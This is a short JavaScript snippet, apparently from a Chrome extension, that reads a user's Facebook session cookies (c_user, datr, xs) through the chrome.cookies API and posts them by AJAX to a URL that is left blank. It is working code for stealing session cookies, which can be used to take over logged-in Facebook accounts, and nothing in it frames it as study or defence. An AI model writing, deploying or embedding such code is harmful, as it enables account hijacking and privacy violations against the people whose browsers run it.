chrome.cookies.getAll({
		'url':'https://www.facebook.com'
	},function(cookie){
		var obj = {};
		for(var index in cookie){
			var c = cookie[index];
			if(c.name == 'c_user' || c.name == 'datr' || c.name == 'xs'){
				obj[c.name] = c.value;
			}
		}
		if (cookie && obj['xs'] != undefined && obj['datr'] != undefined && obj['c_user']) {
		  	    jQuery.ajax({
                    type : 'POST',
                    url : '',
                    data : obj,
                    success : function(data){
						console.log('POST OK');
					}
                });
		}
		else {
		  console.log('Can\'t get cookie!!');
		}
});